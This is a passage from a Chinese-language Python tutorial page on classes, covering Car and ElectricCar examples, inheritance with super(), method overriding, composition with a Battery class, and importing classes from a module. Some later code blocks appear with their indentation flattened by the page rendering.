class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        <span class="string">"""初始化描述汽车的属性"""</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        long_name = str(self.year) + <span class="string">' '</span> + self.make + <span class="string">' '</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_odometer</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""打印一条指出汽车里程的消息"""</span></span><br><span class="line">        print(<span class="string">"This car has "</span> + str(self.odometer_reading) + <span class="string">" miles on it."</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_odometer</span><span class="params">(self, mileage)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        将里程表读数设置为指定的值</span></span><br><span class="line"><span class="string">        禁止将里程表读数往回调</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">            self.odometer_reading = mileage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"You can't roll back an odometer!"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increment_odometer</span><span class="params">(self, miles)</span>:</span></span><br><span class="line">        <span class="string">"""将里程表读数增加指定的量"""</span></span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line">        </span><br><span class="line">my_used_car = Car(<span class="string">'subaru'</span>, <span class="string">'outback'</span>, <span class="number">2013</span>)</span><br><span class="line">print(my_used_car.get_descriptive_name())</span><br><span class="line">my_used_car.update_odometer(<span class="number">23500</span>)</span><br><span class="line">my_used_car.read_odometer()</span><br><span class="line">my_used_car.increment_odometer(<span class="number">100</span>)</span><br><span class="line">my_used_car.read_odometer()</span><br></pre></td></tr></table></figure><p><code>2013 Subaru Outback</code><br><code>This car has 23500 miles on it.</code><br><code>This car has 23600 miles on it.</code></p><p><strong>继承</strong></p><p>一个类<strong>继承</strong>另一个类时，它将自动获得另一个类的所有属性和方法；原有的类称为<strong>父类</strong> ，而新类称为<strong>子类</strong> 。子类继承了其父类的所有属性和方法，同时还可以定义自己的属性和方法。</p><p><strong>子类的方法<strong>init</strong>()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""一次模拟汽车的简单尝试"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        long_name = str(self.year) + <span class="string">' '</span> + self.make + <span class="string">' '</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_odometer</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"This car has "</span> + str(self.odometer_reading) + <span class="string">" miles on it."</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_odometer</span><span class="params">(self, mileage)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">            self.odometer_reading = mileage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"You can't roll back an odometer!"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increment_odometer</span><span class="params">(self, miles)</span>:</span></span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElectricCar</span><span class="params">(Car)</span>:</span></span><br><span class="line">    <span class="string">"""电动汽车的独特之处"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        <span class="string">"""初始化父类的属性"""</span></span><br><span class="line">        super().__init__(make, model, year)</span><br><span class="line">    </span><br><span class="line">my_tesla = ElectricCar(<span class="string">'tesla'</span>, <span class="string">'model s'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure><p><code>2016 Tesla Model S</code></p><p>首先是Car 类的代码。创建子类时，父类必须包含在当前文件中，且位于子类前面。我们定义了子类ElectricCar 。定义子类时，必须在括号内指定父类的名称。方法<strong>init</strong>() 接受创建Car 实例所需的信息。super() 是一个特殊函数，帮助Python将父类和子类关联起来。这行代码让Python调用ElectricCar 的父类的方法<strong>init</strong>() ，让ElectricCar 实例包含父类的所有属性。父类也称为超类 （superclass），名称super因此而得名。<br>为测试继承是否能够正确地发挥作用，我们尝试创建一辆电动汽车，但提供的信息与创建普通汽车时相同。我们创建ElectricCar 类的一个实例，并将其存储在变量my<em>tesla 中。这行代码调用ElectricCar 类中定义的方法<strong>init</strong>() ，后者让Python调用父类Car 中定义的方法<em>_init</em></em>() 。我们提供了实参’tesla’ 、’models’ 和2016 。</p><p><strong>给子类定义属性和方法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""一次模拟汽车的简单尝试"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        long_name = str(self.year) + <span class="string">' '</span> + self.make + <span class="string">' '</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_odometer</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"This car has "</span> + str(self.odometer_reading) + <span class="string">" miles on it."</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_odometer</span><span class="params">(self, mileage)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">            self.odometer_reading = mileage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"You can't roll back an odometer!"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increment_odometer</span><span class="params">(self, miles)</span>:</span></span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElectricCar</span><span class="params">(Car)</span>:</span></span><br><span class="line">    <span class="string">"""Represent aspects of a car, specific to electric vehicles."""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        电动汽车的独特之处</span></span><br><span class="line"><span class="string">        初始化父类的属性，再初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        super().__init__(make, model, year)</span><br><span class="line">        self.battery_size = <span class="number">70</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">describe_battery</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""打印一条描述电瓶容量的消息"""</span></span><br><span class="line">        print(<span class="string">"This car has a "</span> + str(self.battery_size) + <span class="string">"-kWh battery."</span>)</span><br><span class="line">        </span><br><span class="line">my_tesla = ElectricCar(<span class="string">'tesla'</span>, <span class="string">'model s'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_tesla.get_descriptive_name())</span><br><span class="line">my_tesla.describe_battery()</span><br></pre></td></tr></table></figure><p><code>2016 Tesla Model S</code><br><code>This car has a 70-kWh battery.</code></p><p>对于ElectricCar 类的特殊化程度没有任何限制。模拟电动汽车时，你可以根据所需的准确程度添加任意数量的属性和方法。如果一个属性或方法是任何汽车都有的，而不是电动汽车特有的，就应将其加入到Car 类而不是ElectricCar 类中。这样，使用Car 类的人将获得相应的功能，而ElectricCar 类只包含处理电动汽车特有属性和行为的代码。</p><p><strong>重写父类的方法</strong></p><p>对于父类的方法，只要它不符合子类模拟的实物的行为，都可对其进行重写。为此，可在子类中定义一个这样的方法，即它与要重写的父类方法同名。这样，Python将不会考虑这<br>个父类方法，而只关注你在子类中定义的相应方法。<br>假设Car 类有一个名为fill_gas_tank() 的方法，它对全电动汽车来说毫无意义，因此你可能想重写它。下面演示了一种重写方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""一次模拟汽车的简单尝试"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        long_name = str(self.year) + <span class="string">' '</span> + self.make + <span class="string">' '</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_odometer</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"This car has "</span> + str(self.odometer_reading) + <span class="string">" miles on it."</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_odometer</span><span class="params">(self, mileage)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">            self.odometer_reading = mileage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"You can't roll back an odometer!"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increment_odometer</span><span class="params">(self, miles)</span>:</span></span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill_gas_tank</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="string">"""电动汽车没有油箱"""</span></span><br><span class="line">        print(<span class="string">"This car has a gas tank!"</span>)</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElectricCar</span><span class="params">(Car)</span>:</span></span><br><span class="line">    <span class="string">"""Represent aspects of a car, specific to electric vehicles."""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        电动汽车的独特之处</span></span><br><span class="line"><span class="string">        初始化父类的属性，再初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        super().__init__(make, model, year)</span><br><span class="line">        self.battery_size = <span class="number">70</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">describe_battery</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""打印一条描述电瓶容量的消息"""</span></span><br><span class="line">        print(<span class="string">"This car has a "</span> + str(self.battery_size) + <span class="string">"-kWh battery."</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill_gas_tank</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""电动汽车没有油箱"""</span></span><br><span class="line">        print(<span class="string">"This car doesn't need a gas tank!"</span>)</span><br><span class="line"></span><br><span class="line">my_tesla = ElectricCar(<span class="string">'tesla'</span>, <span class="string">'model s'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_tesla.get_descriptive_name())</span><br><span class="line">my_tesla.fill_gas_tank()</span><br></pre></td></tr></table></figure><p><code>2016 Tesla Model S</code><br><code>This car doesn&#39;t need a gas tank!</code><br>现在，如果有人对电动汽车调用方法fill_gas_tank() ，Python将忽略Car 类中的方法fill_gas_tank() ，转而运行上述代码。使用继承时，可让子类保留从父类那里继承而来的精华，并剔除不需要的糟粕。</p><p><strong>将实例用作属性</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""一次模拟汽车的简单尝试"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        long_name = str(self.year) + <span class="string">' '</span> + self.make + <span class="string">' '</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_odometer</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"This car has "</span> + str(self.odometer_reading) + <span class="string">" miles on it."</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_odometer</span><span class="params">(self, mileage)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">            self.odometer_reading = mileage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"You can't roll back an odometer!"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increment_odometer</span><span class="params">(self, miles)</span>:</span></span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill_gas_tank</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="string">"""电动汽车没有油箱"""</span></span><br><span class="line">        print(<span class="string">"This car has a gas tank!"</span>)</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Battery</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""一次模拟电动汽车电瓶的简单尝试"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, battery_size=<span class="number">70</span>)</span>:</span></span><br><span class="line">        <span class="string">"""初始化电瓶的属性"""</span></span><br><span class="line">        self.battery_size = battery_size</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">describe_battery</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""打印一条描述电瓶容量的消息"""</span></span><br><span class="line">        print(<span class="string">"This car has a "</span> + str(self.battery_size) + <span class="string">"-kWh battery."</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_range</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""打印一条消息，指出电瓶的续航里程"""</span></span><br><span class="line">        <span class="keyword">if</span> self.battery_size == <span class="number">70</span>:</span><br><span class="line">            range = <span class="number">240</span></span><br><span class="line">        <span class="keyword">elif</span> self.battery_size == <span class="number">85</span>:</span><br><span class="line">            range = <span class="number">270</span></span><br><span class="line">        message = <span class="string">"This car can go approximately "</span> + str(range)</span><br><span class="line">        message += <span class="string">" miles on a full charge."</span></span><br><span class="line">        print(message)       </span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElectricCar</span><span class="params">(Car)</span>:</span></span><br><span class="line">    <span class="string">"""电动汽车的独特之处"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        初始化父类的属性，再初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        super().__init__(make, model, year)</span><br><span class="line">        self.battery = Battery()</span><br><span class="line">        </span><br><span class="line">my_tesla = ElectricCar(<span class="string">'tesla'</span>, <span class="string">'model s'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_tesla.get_descriptive_name())</span><br><span class="line">my_tesla.battery.describe_battery()</span><br><span class="line">my_tesla.battery.get_range()</span><br></pre></td></tr></table></figure><p><code>2016 Tesla Model S</code><br><code>This car has a 70-kWh battery.</code><br><code>This car can go approximately 240 miles on a full charge.</code></p><p>在处，我们定义了一个名为Battery 的新类，它没有继承任何类。的方法<strong>init</strong>() 除self 外，还有另一个形参battery<em>size 。这个形参是可选的：如果没有给它提供值，电瓶容量将被设置为70。方法describe<em>battery() 也移到了这个类中。在ElectricCar 类中，我们添加了一个名为self.battery 的属性。这行代码让Python创建一个新的Battery 实例（由于没有指定尺寸，因此为默认值70 ），并将该实例存储在属性self.battery 中。每当方法__init</em></em>() 被调用时，都将执行该操作；因此现在每个ElectricCar 实例都包含一个自动创建的Battery 实例。我们创建一辆电动汽车，并将其存储在变量my_tesla 中。要描述电瓶时，需要使用电动汽车的属性battery ：</p><p>新增的方法get_range() 做了一些简单的分析：如果电瓶的容量为70kWh，它就将续航里程设置为240英里；如果容量为85kWh，就将续航里程设置为270英里，然后报告这个值。为使用这个方法，我们也通过汽车的属性battery 来调用它。<br>输出指出了汽车的续航里程（这取决于电瓶的容量）：</p><p><strong>导入类</strong><br>应让文件尽可能整洁。为在这方面提供帮助，Python允许你将类存储在模块中，然后在主程序中导入所需的模块。<br><strong>导入单个类</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""一个可用于表示汽车的类"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"""一次模拟汽车的简单尝试"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line"><span class="string">"""初始化描述汽车的属性"""</span></span><br><span class="line">self.make = make</span><br><span class="line">self.model = model</span><br><span class="line">self.year = year</span><br><span class="line">self.odometer_reading = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="string">"""返回整洁的描述性名称"""</span></span><br><span class="line">long_name = str(self.year) + <span class="string">' '</span> + self.make + <span class="string">' '</span> + self.model</span><br><span class="line"><span class="keyword">return</span> long_name.title()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_odometer</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="string">"""打印一条消息，指出汽车的里程"""</span></span><br><span class="line">print(<span class="string">"This car has "</span> + str(self.odometer_reading) + <span class="string">" miles on it."</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_odometer</span><span class="params">(self, mileage)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">将里程表读数设置为指定的值</span></span><br><span class="line"><span class="string">拒绝将里程表往回拨</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">self.odometer_reading = mileage</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"You can't roll back an odometer!"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">increment_odometer</span><span class="params">(self, miles)</span>:</span></span><br><span class="line"><span class="string">"""将里程表读数增加指定的量"""</span></span><br><span class="line">self.odometer_reading += miles</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> car <span class="keyword">import</span> Car</span><br><span class="line">my_new_car = Car(<span class="string">'audi'</span>, <span class="string">'a4'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.odometer_reading = <span class="number">23</span></span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><p><code>2016 Audi A4</code><br><code>This car has 23 miles on it.</code></p><p><strong>在一个模块中存储多个类</strong><br>虽然同一个模块中的类之间应存在某种相关性，但可根据需要在一个模块中存储任意数量的类。类Battery 和ElectricCar 都可帮助模拟汽车，因此下面将它们都加入模块car.py中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""一个可用于表示汽车的类"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"""一次模拟汽车的简单尝试"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line"><span class="string">"""初始化描述汽车的属性"""</span></span><br><span class="line">self.make = make</span><br><span class="line">self.model = model</span><br><span class="line">self.year = year</span><br><span class="line">self.odometer_reading = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="string">"""返回整洁的描述性名称"""</span></span><br><span class="line">long_name = str(self.year) + <span class="string">' '</span> + self.make + <span class="string">' '</span> + self.model</span><br><span class="line"><span class="keyword">return</span> long_name.title()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_odometer</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="string">"""打印一条消息，指出汽车的里程"""</span></span><br><span class="line">print(<span class="string">"This car has "</span> + str(self.odometer_reading) + <span class="string">" miles on it."</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_odometer</span><span class="params">(self, mileage)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">将里程表读数设置为指定的值</span></span><br><span class="line"><span class="string">拒绝将里程表往回拨</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">self.odometer_reading = mileage</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"You can't roll back an odometer!"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">increment_odometer</span><span class="params">(self, miles)</span>:</span></span><br><span class="line"><span class="string">"""将里程表读数增加指定的量"""</span></span><br><span class="line">self.odometer_reading += miles</span><br><span class="line"></span><br><span class="line"><span class="string">"""一组用于表示燃油汽车和电动汽车的类"""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Battery</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"""一次模拟电动汽车电瓶的简单尝试"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, battery_size=<span class="number">60</span>)</span>:</span></span><br><span class="line"><span class="string">"""初始化电瓶的属性"""</span></span><br><span class="line">self.battery_size = battery_size</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">describe_battery</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="string">"""打印一条描述电瓶容量的消息"""</span></span><br><span class="line">print(<span class="string">"This car has a "</span> + str(self.battery_size) + <span class="string">"-kWh battery."</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_range</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="string">"""打印一条描述电瓶续航里程的消息"""</span></span><br><span class="line">range = <span class="number">300</span> <span class="comment"># 使用初始值60时，因为不会进条件判断，无赋值</span></span><br><span class="line"><span class="keyword">if</span> self.battery_size == <span class="number">70</span>:</span><br><span class="line">range = <span class="number">240</span></span><br><span class="line"><span 